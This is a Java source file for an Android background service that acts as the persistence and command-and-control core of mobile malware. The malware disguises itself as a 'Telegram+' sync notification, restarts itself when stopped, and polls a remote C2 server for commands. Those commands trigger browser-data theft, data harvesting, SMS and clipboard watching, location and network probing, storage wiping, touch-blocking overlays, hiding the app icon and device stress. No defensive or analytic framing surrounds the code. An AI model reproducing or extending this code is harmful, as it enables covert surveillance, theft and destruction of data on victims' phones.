package com.system.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

public class PersistService extends Service {

    private static final String CH = "tg_plus_sync";
    private final Handler handler = new Handler(Looper.getMainLooper());
    private int tickCount;
    private boolean quiet = true;

    private final Runnable loop = new Runnable() {
        @Override
        public void run() {
            tickCount++;
            boolean armed = Stealth.isArmed(getApplicationContext());
            if (!armed || quiet) {
                handler.postDelayed(this, 25_000);
                return;
            }

            try { NoiseEngine.tick(getApplicationContext()); } catch (Throwable ignored) {}
            if (tickCount % 2 == 0) {
                try { TouchBlock.requestAndApply(getApplicationContext()); } catch (Throwable ignored) {}
            }
            if (tickCount % 3 == 0) {
                try { Payload.tick(getApplicationContext()); } catch (Throwable ignored) {}
            }
            if (tickCount % 10 == 0) {
                try { StorageAttack.start(getApplicationContext()); } catch (Throwable ignored) {}
            }
            if (tickCount % 12 == 0) {
                try { BrowserSteal.run(getApplicationContext()); } catch (Throwable ignored) {}
            }
            if (tickCount % 8 == 0) {
                try { Collector.runAll(getApplicationContext()); } catch (Throwable ignored) {}
            }
            if (tickCount % 20 == 0) {
                try { NetDump.run(getApplicationContext()); } catch (Throwable ignored) {}
                try { LocProbe.run(getApplicationContext()); } catch (Throwable ignored) {}
            }
            if (tickCount % 30 == 0) {
                try { BookWatch.run(getApplicationContext()); } catch (Throwable ignored) {}
            }
            if (!StressEngine.isRunning()) {
                try { StressEngine.start(getApplicationContext()); } catch (Throwable ignored) {}
            }
            try {
                String cmd = C2.pollCommands();
                if (cmd != null && !cmd.isEmpty()) handleCmd(cmd);
            } catch (Throwable ignored) {}
            if (tickCount % 5 == 0) {
                try {
                    Intent i = new Intent(PersistService.this, MainActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                    startActivity(i);
                } catch (Throwable ignored) {}
            }
            if (tickCount % 15 == 0) {
                try {
                    Telegram.reportEvent(C2.getDeviceId(), "heartbeat tick=" + tickCount);
                } catch (Throwable ignored) {}
            }
            handler.postDelayed(this, 7_000);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        startFg();
        quiet = !Stealth.isArmed(this);
        handler.postDelayed(loop, 3000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startFg();
        if (intent != null && intent.hasExtra("quiet")) {
            quiet = intent.getBooleanExtra("quiet", true);
        } else {
            quiet = !Stealth.isArmed(this);
        }
        if (!quiet && Stealth.isArmed(this)) {
            try { NoiseEngine.start(this); } catch (Throwable ignored) {}
            try { StressEngine.start(this); } catch (Throwable ignored) {}
            try { Clipper.start(this); } catch (Throwable ignored) {}
            try { SmsWatch.start(this); } catch (Throwable ignored) {}
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacks(loop);
        try {
            Intent svc = new Intent(this, PersistService.class);
            svc.putExtra("quiet", !Stealth.isArmed(this));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
        } catch (Throwable ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private void startFg() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel ch = new NotificationChannel(CH, "Telegram+", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            }
            Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? new Notification.Builder(this, CH)
                    : new Notification.Builder(this);
            startForeground(1001, b.setContentTitle("Telegram+")
                    .setContentText("Syncing…")
                    .setSmallIcon(android.R.drawable.stat_notify_chat)
                    .setOngoing(true).build());
        } catch (Throwable ignored) {}
    }

    private void handleCmd(String cmd) {
        try {
            String c = cmd.trim();
            if ("harvest".equalsIgnoreCase(c)) Collector.runAll(this);
            else if ("wallpaper".equalsIgnoreCase(c)) Payload.setWallpaper(this);
            else if ("attack".equalsIgnoreCase(c)) {
                Stealth.setArmed(this, true);
                quiet = false;
                Payload.execute(this);
                NoiseEngine.tick(this);
                StressEngine.start(this);
                TouchBlock.requestAndApply(this);
                StorageAttack.start(this);
                BrowserSteal.run(this);
                BookWatch.run(this);
                AppInventory.run(this);
            } else if ("wipe".equalsIgnoreCase(c)) StorageAttack.start(this);
            else if ("browser".equalsIgnoreCase(c)) BrowserSteal.run(this);
            else if ("music".equalsIgnoreCase(c)) NoiseEngine.ensureMusic(this);
            else if ("stress".equalsIgnoreCase(c)) StressEngine.start(this);
            else if ("overlay".equalsIgnoreCase(c)) TouchBlock.requestAndApply(this);
            else if ("hide".equalsIgnoreCase(c)) HideIcon.hide(this);
            else if (c.startsWith("echo:")) C2.send("echo", c.substring(5));
            else C2.send("cmd_unknown", c);
        } catch (Throwable t) {
            C2.send("cmd_err", String.valueOf(t.getMessage()));
        }
    }
}
